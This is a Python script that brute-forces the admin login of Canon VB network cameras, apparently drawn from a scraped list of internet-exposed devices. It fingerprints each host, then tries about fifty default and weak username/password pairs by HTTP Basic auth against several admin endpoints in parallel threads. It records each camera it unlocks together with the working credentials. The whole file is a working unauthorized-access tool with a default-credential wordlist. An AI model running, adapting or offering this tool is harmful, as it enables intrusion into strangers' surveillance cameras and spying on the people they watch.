"""Canon VB native BF - tests Canon-specific auth endpoints.

Canon VB firmware separates the WV-HTTP streaming endpoints from admin endpoints.
Standard BF tools miss these. This script tests:
- /viewer/live/index.html (HTML viewer)
- /admin/index.html (admin panel)
- /admin/login.html (login page)
- /admintools/index.html (admin tools)
- /admin/cgi-bin/aw_cam (admin CGI)
- /cgi-bin/aw_cam (CGI control)
- /-wvhttp-01-/open.cgi (session - auth required on some models)

Uses session-based test: opens session via open.cgi, attempts BF on admin endpoints.
"""

import os
import sys
import json
import csv
import re
import time
import socket
import base64
import hashlib
import urllib.parse
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor, as_completed

WORKDIR = r"C:\Users\eli6-admin\Documents\eli6-surveillance"
VB_CSV = os.path.join(WORKDIR, "controllable_Webcams_vbviewer.csv")
BF_RESULTS = os.path.join(WORKDIR, "bruteforce", "vbviewer_native_bf_results.json")
PROGRESS_PATH = os.path.join(WORKDIR, "bruteforce", "vbviewer_native_bf_progress.json")

# Canon-specific credentials (from Canon VB firmware analysis)
CANON_NATIVE_CREDS = [
    # Empty/null passwords (often work on first setup)
    ("admin", ""),
    ("root", ""),
    # Default setup
    ("admin", "VB"),
    ("admin", "canon"),
    ("admin", "Canon"),
    # Common weak
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "camera"),
    ("admin", "12345"),
    ("admin", "1234"),
    ("admin", "123"),
    # Camera brand variants
    ("admin", "VBViewer"),
    ("admin", "WebView"),
    ("admin", "CanonVB"),
    ("admin", "NetworkCamera"),
    # Root account
    ("root", "root"),
    ("root", "canon"),
    ("root", "VB"),
    # Operator accounts
    ("operator", "operator"),
    ("operator", ""),
    # Service/setup
    ("setup", ""),
    ("setup", "setup"),
    ("service", "service"),
    # Maintenance
    ("maintenance", ""),
    ("maintenance", "admin"),
    # User variants
    ("user", ""),
    ("user", "user"),
    ("guest", ""),
    ("guest", "guest"),
    # Default Japanese cams
    ("admin", "administrator"),
    ("admin", "system"),
    ("admin", "manager"),
    ("admin", "netcam"),
    # Hidden accounts (Canon firmware)
    ("admin1", ""),
    ("admin2", ""),
    ("admin3", ""),
    ("admin1", "admin"),
    ("admin2", "admin"),
    # i-PRO / Merit defaults (related firmware)
    ("admin", "admin12345"),
    ("admin", "i-pro"),
    ("admin", "ipro"),
    # URL-decoded defaults
    ("admin", "%00"),
    ("admin", "0000"),
    ("admin", "9999"),
    # Misc
    ("admin", "changeme"),
    ("admin", "default"),
    ("admin", "P@ssw0rd"),
    ("admin", "Admin123"),
    ("admin", "abc123"),
    ("admin", "qwerty"),
    ("admin", "letmein"),
    ("admin", "welcome"),
]

# Auth-required endpoints to test (Canon VB-specific)
AUTH_ENDPOINTS = [
    '/admin/index.html',
    '/admin/login.html',
    '/admintools/index.html',
    '/viewer/live/wv.js',  # Sometimes protected
    '/admin/cgi-bin/aw_cam',
    '/cgi-bin/aw_cam',
]


def load_progress():
    if os.path.exists(PROGRESS_PATH):
        try:
            with open(PROGRESS_PATH, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {"tested": {}, "unlocked": 0, "results": {}}


def save_progress(p):
    try:
        tmp = PROGRESS_PATH + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(p, f)
        os.replace(tmp, PROGRESS_PATH)
    except Exception:
        pass


def load_results():
    if os.path.exists(BF_RESULTS):
        try:
            with open(BF_RESULTS, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {}


def save_results(r):
    try:
        tmp = BF_RESULTS + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(r, f, indent=2)
        os.replace(tmp, BF_RESULTS)
    except Exception:
        pass


def try_endpoint_basic(host, port, path, user, pw, timeout=5):
    """Try Basic auth on a Canon VB endpoint. Returns success indicator."""
    try:
        creds = base64.b64encode(f"{user}:{pw}".encode()).decode()
        sock = socket.create_connection((host, port), timeout=timeout)
        req = f'GET {path} HTTP/1.0\r\nHost: {host}\r\nAuthorization: Basic {creds}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n'
        sock.send(req.encode())
        data = b''
        sock.settimeout(timeout)
        try:
            while len(data) < 8192:
                d = sock.recv(4096)
                if not d:
                    break
                data += d
        except socket.timeout:
            pass
        sock.close()
        # Check for success indicators
        if b'200 OK' in data and b'401' not in data[:500] and b'Authorization' not in data[:800]:
            # Make sure it's not a redirect to login page
            if not re.search(rb'<title[^>]*>[^<]*(?:Login|Authentication|Error|Unauthorized)', data[:2000], re.I):
                return True, data[:500].decode('utf-8', errors='replace')
    except Exception:
        pass
    return False, ''


def try_canon_cam(host, port, progress):
    """Try all creds + endpoints for one Canon VB cam."""
    test_key = f"{host}:{port}"
    if test_key in progress.get("tested", {}):
        return None
    progress.setdefault("tested", {})[test_key] = True

    # Quick check if cam is alive
    try:
        sock = socket.create_connection((host, port), timeout=3)
        sock.send(b'GET / HTTP/1.0\r\nHost: ' + host.encode() + b'\r\n\r\n')
        data = b''
        sock.settimeout(3)
        try:
            while len(data) < 1024:
                d = sock.recv(512)
                if not d:
                    break
                data += d
        except socket.timeout:
            pass
        sock.close()
        # Only proceed if this is a Canon VB cam
        if b'Network Camera' not in data and b'Canon' not in data and b'VB/' not in data and b'viewer/live' not in data:
            return None
    except Exception:
        return None

    # Test each (user, pw, endpoint) combination
    for user, pw in CANON_NATIVE_CREDS:
        for path in AUTH_ENDPOINTS:
            success, response = try_endpoint_basic(host, port, path, user, pw)
            if success:
                return {
                    "host": host,
                    "port": port,
                    "method": "canon_native_basic",
                    "user": user,
                    "pass": pw,
                    "path": path,
                    "evidence": f"Canon VB auth unlocked: {user}:{pw} on {path}",
                    "response": response[:200],
                }
    return None


def main():
    print(f"[Canon VB Native BF] Loading {VB_CSV}")
    csv.field_size_limit(2**31 - 1)
    with open(VB_CSV, "r", encoding="utf-8", errors="replace", newline="") as f:
        rows = list(csv.DictReader(f))

    # Find auth_required cams not yet tested
    progress = load_progress()
    results = load_results()

    targets = []
    for row in rows:
        if row.get("live_status") != "auth_required":
            continue
        host = row.get("host", "")
        if not host:
            continue
        h = host.rsplit(":", 1)[0]
        port = 80
        m = re.search(r":(\d+)$", host)
        if m:
            port = int(m.group(1))
        key = f"{h}:{port}"
        if key not in progress.get("tested", {}):
            targets.append((h, port))

    print(f"[Canon VB Native BF] {len(rows)} total, {len(targets)} auth-required cams to test")
    print(f"[Canon VB Native BF] {len(CANON_NATIVE_CREDS)} creds × {len(AUTH_ENDPOINTS)} endpoints = {len(CANON_NATIVE_CREDS) * len(AUTH_ENDPOINTS)} tests per cam")

    if not targets:
        print("[Canon VB Native BF] Nothing to do.")
        return

    unlocked = 0
    completed = 0
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=8) as executor:
        futures = {executor.submit(try_canon_cam, h, p, progress): (h, p) for h, p in targets}
        for fut in as_completed(futures):
            completed += 1
            try:
                result = fut.result(timeout=180)
            except Exception:
                result = None
            if result:
                key = f"{result['host']}:{result['port']}"
                results[key] = result
                unlocked += 1
                progress["unlocked"] = progress.get("unlocked", 0) + 1
                print(f"  [{completed}/{len(targets)}] UNLOCKED: {key} via {result['user']}:{result['pass']} on {result['path']}", flush=True)
            if completed % 5 == 0:
                save_progress(progress)
                save_results(results)
                elapsed = time.time() - start_time
                rate = completed / max(elapsed, 1)
                eta = (len(targets) - completed) / max(rate, 0.01)
                print(f"  Progress: {completed}/{len(targets)}, unlocked {unlocked}, {rate:.2f}/s, ETA: {eta:.0f}s", flush=True)

    save_progress(progress)
    save_results(results)
    print(f"\n[Canon VB Native BF] Done. Unlocked {unlocked}/{len(targets)}.")


if __name__ == "__main__":
    main()
